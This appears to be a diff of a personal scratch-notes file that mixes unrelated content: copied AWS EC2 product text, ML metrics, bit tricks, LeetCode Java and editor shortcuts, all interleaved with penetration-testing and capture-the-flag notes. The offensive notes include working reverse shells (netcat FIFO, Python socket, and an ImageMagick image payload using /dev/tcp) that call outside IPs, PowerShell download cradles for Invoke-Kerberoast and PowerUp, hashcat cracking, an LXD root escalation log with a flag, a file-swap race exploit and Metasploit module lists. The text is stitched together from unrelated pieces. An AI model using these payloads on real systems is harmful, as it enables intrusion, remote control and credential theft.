+With T2 Unlimited enabled, the t2.small instance can burst above the baseline even after its CPU Credit balance is drawn down to zero. For a vast majority of general purpose workloads where the average CPU utilization is at or below the baseline performance, the basic hourly price for t2.small covers all CPU bursts. If the instance happens to run at an average 25% CPU utilization (5% above baseline) over a period of 24 hours after its CPU Credit balance is drawn to zero, it will be charged an additional 6 cents (5 cents/vCPU-hour x 1 vCPU x 5% x 24 hours).
+
+Many applications such as web servers, developer environments and small databases don’t need consistently high levels of CPU, but benefit significantly from having full access to very fast CPUs when they need them. T instances are engineered specifically for these use cases. If you need consistently high CPU performance for applications such as video encoding, high volume websites or HPC applications, we recommend you use Fixed Performance Instances. T instances are designed to perform as if they have dedicated high speed Intel cores available when your application really needs CPU performance, while protecting you from the variable performance or other common side-effects you might typically see from over-subscription in other environments.
+Multiple Storage Options
+Amazon EC2 allows you to choose between multiple storage options based on your requirements. Amazon EBS is a durable, block-level storage volume that you can attach to a single, running Amazon EC2 instance. You can use Amazon EBS as a primary storage device for data that requires frequent and granular updates. For example, Amazon EBS is the recommended storage option when you run a database on Amazon EC2. Amazon EBS volumes persist independently from the running life of an Amazon EC2 instance. Once a volume is attached to an instance you can use it like any other physical hard drive. Amazon EBS provides three volume types to best meet the needs of your workloads: General Purpose (SSD), Provisioned IOPS (SSD), and Magnetic. General Purpose (SSD) is the new, SSD-backed, general purpose EBS volume type that we recommend as the default choice for customers. General Purpose (SSD) volumes are suitable for a broad range of workloads, including small to medium sized databases, development and test environments, and boot volumes. Provisioned IOPS (SSD) volumes offer storage with consistent and low-latency performance, and are designed for I/O intensive applications such as large relational or NoSQL databases. Magnetic volumes provide the lowest cost per gigabyte of all EBS volume types. Magnetic volumes are ideal for workloads where data is accessed infrequently, and applications where the lowest storage cost is important.
+
+Many Amazon EC2 instances can also include storage from disks that are physically attached to the host computer. This disk storage is referred to as instance store. Instance store provides temporary block-level storage for Amazon EC2 instances. The data on an instance store volume persists only during the life of the associated Amazon EC2 instance.
+
+In addition to block level storage via Amazon EBS or instance store, you can also use Amazon S3 for highly durable, highly available object storage. Learn more about Amazon EC2 storage options from the Amazon EC2 documentation.
+
+EBS-optimized Instances
+For an additional, low, hourly fee, customers can launch selected Amazon EC2 instances types as EBS-optimized instances. For M6g, M5, M4, C6g, C5, C4, R6g, P3, P2, G3, and D2 instances, this feature is enabled by default at no additional cost. EBS-optimized instances enable EC2 instances to fully use the IOPS provisioned on an EBS volume. EBS-optimized instances deliver dedicated throughput between Amazon EC2 and Amazon EBS, with options between 500 and 4,000 Megabits per second (Mbps) depending on the instance type used. The dedicated throughput minimizes contention between Amazon EBS I/O and other traffic from your EC2 instance, providing the best performance for your EBS volumes. EBS-optimized instances are designed for use with all EBS volumes. When attached to EBS-optimized instances, Provisioned IOPS volumes can achieve single digit millisecond latencies and are designed to deliver within 10% of the provisioned IOPS performance 99.9% of the time. We recommend using Provisioned IOPS volumes with EBS-optimized instances or instances that support cluster networking for applications with high storage I/O requirements.
+
+Cluster Networking
+Select EC2 instances support cluster networking when launched into a common cluster placement group. A cluster placement group provides low-latency networking between all instances in the cluster. The bandwidth an EC2 instance can utilize depends on the instance type and its networking performance specification. Inter instance traffic within the same region can utilize up to 5 Gbps for single-flow and up to 100 Gbps for multi-flow traffic in each direction (full duplex). Traffic to and from S3 buckets in the same region can also utilize all available instance aggregate bandwidth. When launched in a placement group, instances can utilize up to 10 Gbps for single-flow traffic and up to 100 Gbps for multi-flow traffic. Network traffic to the Internet is limited to 5 Gbps (full duplex). Cluster networking is ideal for high performance analytics systems and many science and engineering applications, especially those using the MPI library standard for parallel programming.
+
+Intel Processor Features
+xeon-pltnm-m-ww-rgb-60 (2)
+Amazon EC2 instances that feature an Intel processor may provide access to the following processor features:
+
+Intel AES New Instructions (AES-NI): Intel AES-NI encryption instruction set improves upon the original Advanced Encryption Standard (AES) algorithm to provide faster data protection and greater security. All current generation EC2 instances support this processor feature.
+Intel Advanced Vector Extensions (Intel AVX, Intel AVX2 and Intel AVX-512): Intel AVX and Intel AVX2 are 256-bit and Intel AVX-512 is a 512-bit instruction set extensions designed for applications that are Floating Point (FP) intensive. Intel AVX instructions improve performance for applications like image and audio/video processing, scientific simulations, financial analytics, and 3D modeling and analysis. These features are only available on instances launched with HVM AMIs.
+Intel Turbo Boost Technology: Intel Turbo Boost Technology provides more performance when needed. The processor is able to automatically run cores faster than the base operating frequency to help you get more done faster.
+Intel Deep Learning Boost (Intel DL Boost): A new set of built-in processor technologies designed to accelerate AI deep learning use cases. The 2nd Gen Intel Xeon Scalable processors extend Intel AVX-512 with a new Vector Neural Network Instruction (VNNI/INT8) that significantly increases deep learning inference performance over previous generation Intel Xeon Scalable processors (with FP32), for image recognition/segmentation, object detection, speech recognition, language translation, recommendation systems, reinforcement learning and others. VNNI may not be compatible with all Linux distributions. Please check documentation before using. 
+Not all processor features are available in all instance types, check out the instance type matrix for more detailed information on which features are available from which instance types.
+
+Measuring Instance Performance
+Why should you measure instance performance?
+Amazon EC2 allows you to provision a variety of instances types, which provide different combinations of CPU, memory, disk, and networking. Launching new instances and running tests in parallel is easy, and we recommend measuring the performance of applications to identify appropriate instance types and validate application architecture. We also recommend rigorous load/scale testing to ensure that your applications can scale as you intend.
+Considerations for Amazon EC2 performance evaluation
+Amazon EC2 provides you with a large number of options across ten different instance types, each with one or more size options, organized into six distinct instance families optimized for different types of applications. We recommend that you assess the requirements of your applications and select the appropriate instance family as a starting point for application performance testing. You should start evaluating the performance of your applications by (a) identifying how your application needs compare to different instance families (e.g. is the application compute-bound, memory-bound, etc.?), and (b) sizing your workload to identify the appropriate instance size. There is no substitute for measuring the performance of your full application since application performance can be impacted by the underlying infrastructure or by software and architectural limitations. We recommend application-level testing, including the use of application profiling and load testing tools and services. For more information, open a support case and ask for additional network performance specifications for the specific instance types that you are interested in.
 
 
 
-Hacking PNG 
--------------------------------------
 
-PNG starts with an 8-byte magic header:
+https://www.longdom.org/articles-images/information-technology-software-engineering-theoretical-research-model-9-256-g001.png
 
-89 50 4E 47 0D 0A 1A 0A
-const pngHeader = "\x89PNG\r\n\x1a\n" from https://golang.org/src/image/png/reader.go.
-When you open a PNG file, you can see PNG in the signature.
 
-After the signature, there are a number of chunks.
 
+
+NTLM hash in python 
+
+import hashlib,binascii
+hash = hashlib.new('md4', "thisismyhashvalue".encode('utf-16le')).digest()
+print binascii.hexlify(hash)
+
+
+prince password generation 
+
+pp64.bin --pw-min=8 < dict.txt | head -20 shuf dict.txt | pp64.bin --pw-min=8 | head -20
+
+purple rain 
+
+shuf dict.txt | pp64.bin --pw-min=8 | hashcat -a 0 -m #type -w 4 -O hashes.txt -g 300000
+
+
+Lets first enumerate Windows. If we run setspn -T medin -Q ​ */* we can extract all accounts in the SPN.
+
+SPN is the Service Principal Name, and is the mapping between service and account.
+
+Running that command, we find an existing SPN. What user is that for?
+
+setspn -T medin -Q */*
+
+
+Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
+
+Lets first get the Powershell Invoke-Kerberoast script.
+
+iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+
+
+Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl
+
+
+Lets use hashcat to bruteforce this password. The type of hash we’re cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.
+
+hashcat -m 13100 -​a 0 hash.txt wordlist --force
+
+Crack the hash. What is the users password in plain text?
+
+We will run PowerUp.ps1 for the enumeration.
+
+Lets load PowerUp1.ps1 into memory.
+
+iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
+
+
+The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.
+
+“Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode.” Read more about it here.
+
+It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.
+
+
+
+Now we have the Administrator’s password, login as them and obtain the last flag.
+
+When you will connect as administrator, you will be prompted to change the password. Make sure you set up a strong password, else you’ll have to type the password again :).
+
+The flag is on the desktop:
+
+Answer: THM{g00d_j0b_SYS4DM1n_M4s73R}
+
+
+
+
+understanding usefull metrics
+
+False negatives and false positives are samples that were incorrectly classified
+True negatives and true positives are samples that were correctly classified
+Accuracy is the percentage of examples correctly classified
+true samplestotal samples 
+
+Precision is the percentage of predicted positives that were correctly classified
+true positivestrue positives + false positives 
+
+Recall is the percentage of actual positives that were correctly classified
+true positivestrue positives + false negatives 
+
+AUC refers to the Area Under the Curve of a Receiver Operating Characteristic curve (ROC-AUC). This metric is equal to the probability that a classifier will rank a random positive sample higher than a random negative sample.
+AUPRC refers to Area Under the Curve of the Precision-Recall Curve. This metric computes precision-recall pairs for different probability thresholds.
+
+
+
+
+
+send thru CURL 
+
+ curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
+ 
+ 
+ server side filter
+ <?php
+    //Get the extension
+    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
+    //Check the extension against the blacklist -- .php and .phtml
+    switch($extension){
+        case "php":
+        case "phtml":
+        case NULL:
+            $uploadFail = True;
+            break;
+        default:
+            $uploadFail = False;
+    }
+?>
+
+
+faulty filter pseudocode used in apache2 
+
+ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput
+IF STRING ".jpg" IS IN VARIABLE userInput:
+    SAVE THE FILE
+ELSE:
+    RETURN ERROR MESSAGE
+	
+	the best alternative to cat 
+	is TAC command(tac)
+	
+	
+	
+	
+	ICACLS
+	
+	
+	I - permission inherited from the parent container
+
+F - full access (full control)
+
+M - Modify right/access
+
+OI - object inherit
+
+IO - inherit only
+
+CI - container inherit
+
+RX - read and execute
+
+AD - append data (add subdirectories)
+
+WD - write data and add files
+
+
+
+
+TRICKS 
+--------------
+
+or is addition 
+and is modulo 
+<< left shift is multiply by 2
+>> right shift is division by 2
+xor is to check equality 
+to uppercase do or with underscore
+to lowercase do or with space
+ ~(num)+1  is 2nd complement 
+~num is 1st complement
+basic encryption is XOR
+swap number is using XOR
+find max and min by XOR
+find even and odd using & operation (modulo)
+
+
+privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.
+
+General:
+
+https://github.com/swisskyrepo/PayloadsAllTheThings (A bunch of tools and payloads for every stage of pentesting)
+Linux:
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (a bit old but still worth looking at)
+https://github.com/rebootuser/LinEnum (One of the most popular priv esc scripts)
+https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh (Another popular script)
+https://github.com/mzet-/linux-exploit-suggester (A Script that's dedicated to searching for kernel exploits)
+https://gtfobins.github.io (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)
+Windows:
+
+https://www.fuzzysecurity.com/tutorials/16.html (Dictates some very useful commands and methods to enumerate the host and gain intel)
+https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp (A bit old but still an incredibly useful script)
+https://github.com/411Hall/JAWS (A general enumeration script)
+
+
+
+
+fcrackzip -vbDp /usr/share/wordlists/rockyou.txt christmaslists.zip
+steghide extract -sf TryHackMe.jpg
+
+
+Name	Big-O
+Constant	O(1)
+Logarithmic	O(log(n))
+Linear	O(n)
+Log Linear	O(n log(n))
+Quadratic	O(n^2)
+Cubic	O(n^3)
+Exponential	O(2^n)
+
+
+
+if test -n "$GIT_PUSH_OPTION_COUNT"
+then
+	i=0
+	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
+	do
+		eval "value=\$GIT_PUSH_OPTION_$i"
+		case "$value" in
+		echoback=*)
+			echo "echo from the pre-receive-hook: ${value#*=}" >&2
+			;;
+		reject)
+			exit 1
+		esac
+		i=$((i + 1))
+	done
+fi
+mkfifo /tmp/f; nc 10.8.106.222 9001 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+
+
+kali@kali:/data/magician/files$ cat > image.png << EOF
+> push graphic-context
+> encoding "UTF-8"
+> viewbox 0 0 1 1
+> affine 1 0 0 1 0 0
+> push graphic-context
+> image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
+> pop graphic-context
+> pop graphic-context
+> EOF
+
+
+
+
+good privilege escalation 
+
+
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <stdlib.h>
+
+int main(int argc, char* argv[]) {
+    int file_data; char buffer[256]; int size = 0;
+
+    if(argc != 2) {
+      printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
+      exit(1);
+    }
+
+    if (!access(argv[1],R_OK)) {
+      sleep(1);
+      file_data = open(argv[1], O_RDONLY);
+    } else {
+      fprintf(stderr, "Cannot open %s \n", argv[1]);
+      exit(1);
+    }
+
+    do {
+        size = read(file_data, buffer, 256);
+        write(1, buffer, size);
+    } 
+    
+    while(size>0);
+
+}
+
+
+
+
+
+
+john@exploitable:~$ wget http://10.8.106.222/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz
+--2020-10-14 08:56:48--  http://10.8.106.222/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz
+Connecting to 10.8.106.222:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3183829 (3.0M) [application/gzip]
+Saving to: ‘alpine-v3.12-x86_64-20201014_1053.tar.gz’
+
+alpine-v3.12-x86_64-2 100%[========================>]   3.04M  1.04MB/s    in 2.9s
+
+2020-10-14 08:56:51 (1.04 MB/s) - ‘alpine-v3.12-x86_64-20201014_1053.tar.gz’ saved [3183829/3183829]
+
+john@exploitable:~$ lxc image list
++-------+-------------+--------+-------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+------+------+-------------+
+john@exploitable:~$ lxc image import ./alpine-v3.12-x86_64-20201014_1053.tar.gz --alias myimage
+Image imported with fingerprint: 8f83febe3dd6858c008db1d6ef7327876b93df2f5846489921dcc6
+john@exploitable:~$ lxc image list
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| myimage | 8f83febe3dd6 | no     | alpine v3.12 (20201014_10:53) | x86_64 | 3.04MB | Oct 14, 2020 at 8:58am (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
+Creating ignite
+john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+john@exploitable:~$ lxc start ignite
+john@exploitable:~$ lxc exec ignite /bin/bash
+john@exploitable:~$ lxc exec ignite /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+~ # find / -type f -name root.txt 2>/dev/null
+/mnt/root/root/root.txt
+~ # cat /mnt/root/root/root.txt
+2e337b8c9f3aff0c2b3e8d4e6a7c88
+
+
+
+
+
+SSL filters
+SSL
+ssl
+ssl.alpn
+ssl.cert.alg
+ssl.cert.expired
+ssl.cert.extension
+ssl.cert.fingerprint
+ssl.cert.issuer.cn
+ssl.cert.pubkey.bits
+ssl.cert.pubkey.type
+ssl.cert.serial
+ssl.cert.subject.cn
+ssl.chain_count
+ssl.cipher.bits
+ssl.cipher.name
+ssl.cipher.version
+ssl.ja3s
+ssl.jarm
+ssl.version
+
+
+
+
+Memoization 
+1d, 2d, 3d
+------------------------
+
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+
+// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
+int main(int argc, char *argv[]) {
+  while (1) {
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  }
+  return 0;
+} 
+
+
+
+
+
+onesixtyone  10.10.24.181 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
+
+
+
+
+
+class Solution {
+    public int minJumps(int[] arr) {
+        if (arr.length == 1)
+            return 0;
+        int count = 0;
+        int length = arr.length;
+        Map<Integer, List<Integer>> graph = new HashMap<>();
+        // populate the graph with index
+        for (int i=0; i<length; i++)
+            graph.computeIfAbsent(arr[i], x->new LinkedList<>()).add(i);
+        // create the boolean array visited
+        boolean [] visited = new boolean [length];
+        // mark the first element as visited
+        visited[0] = true;
+        // since we do bfs, we need a queue
+        Queue<Integer> queue = new LinkedList<>();
+        queue.offer(0);
+        while (!queue.isEmpty()) {
+            int size = queue.size();
+            for (int i=size; i>0; i--) {
+                int current = queue.poll();
+                // if we reach the last index
+                if (current == length - 1)
+                    return count;
+                // get the possible next values
+                List<Integer> next = graph.get(arr[current]);
+                // now lets add the previous, ie current-1, next ies, current + 1 into the list
+                next.add(current-1);
+                next.add(current+1);
+                for (Integer j:next) {
+                    if (j >= 0 && j<length && !visited[j]) {
+                        visited[j] = true;
+                        queue.offer(j);
+                    }
+                }
+                next.clear(); 
+            }
+            count += 1;
+        }
+        return 0;
+    }
+}
+
+
+JArray array = new JArray();
+array.Add("Manual text");
+array.Add(new DateTime(2000, 5, 23));
+
+JObject o = new JObject();
+o["MyArray"] = array;
+
+string json = o.ToString();
+// {
+//   "MyArray": [
+//     "Manual text",
+//     "2000-05-23T00:00:00"
+//   ]
+// }
+
+
+
+
+
+drozer 
+
+Basic Cheatsheet of Drozer
+
+Exploiting Content Provider
+
+run app.provider.info -a package_name
+
+run scanner.provider.finduris -a package_name
+
+run app.provider.query uri
+
+run app.provider.update uri --selection conditions selection_arg column data
+
+run scanner.provider.sqltables -a package_name
+
+run scanner.provider.injection -a package_name
+
+run scanner.provider.traversal -a package_name
+
+Exploiting Service
+
+run app.service.info -a package_name
+
+run app.service.start --action action --component package_name component_name
+
+run app.service.send package_name component_name --msg what arg1 arg2 --extra type key value --bundle-as-obj
+
+
+
+
+
+
+Metasploit 
+-----------------
+
+ProFPTD 
+use exploit/unix/ftp/proftpd_modcopy_exec
+
+
+Apache HTTP Server
+-----------------------
+ use exploit/multi/http/apache_mod_cgi_bash_env_exec
+ 
+ 
+ Drupal 
+ -----------
+ use exploit/multi/http/drupal_drupageddon 
+ 
+ 
+ PhpMyAdmin 
+ --------------
+use exploit/multi/http/phpmyadmin_preg_replace
+
+
+Ruby on Rails 
+----------------
+ use exploit/multi/http/rails_actionpack_inline_exec
+ 
+ CUPS 
+ ---------
+ use exploit/multi/http/cups_bash_env_exec
+ 
+ 
+ Unreal IRCd
+ --------------------
+ use exploit/unix/irc/unreal_ircd_3281_backdoor
+ 
+ 
+ Apache continuum 
+ ----------------------
+ use exploit/linux/http/apache_continuum_cmd_exec 
+ 
+ 
+ Docker daemon Local Privilege escalation 
+ --------------------------------------------
+  use exploit/linux/local/docker_daemon_privilege_escalation
+  
+  
+  Samba
+  -----------
+  use auxiliary/admin/smb/upload_file
+  
+  
+  [ Python code used for DNS Exfiltration and Infiltration ]
+
+I have created a few simple scripts written in Python for you to complete this walkthrough. This will allow us to make DNS queries to a remote DNS Server.
+git clone https://github.com/kleosdc/dns-exfil-infil
+
+Also, make sure you have the required Python3 modules in order to run the python code.
+
+Use the following command to install the required modules:
+
+sudo pip3 install -r requirements.txt
+
+[ Program used for DNS Tunneling ]
+
+https://github.com/yarrick/iodine
+
+sudo apt install iodine
+
+[ Download Wireshark ]
+
+You may use Wireshark or tshark to capture packets. The python code uses .PCAP file to extract the captured data and then decode it.
+https://www.wireshark.org/download.html
+
+sudo apt install -y tshark
+
+
+
+Keyboard shortcuts
+------------------------
+
+Jump Over Words
+ALT + Left/Right
+
+Go to end of line
+CMD + Right
+
+Go to beginning of line
+CMD + Left
+
+Go to the top of a file
+CMD + Up
+
+Go to the bottom of a file
+CMD + Down
+
+Select by Word
+SHIFT + ALT + Left/Right
+
+Select the rest of a line from current cursor
+SHIFT + CMD + Left/Right
+
+Select everything above/below the current cursor
+SHIFT + CMD + Up/Down
+
+
+
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 
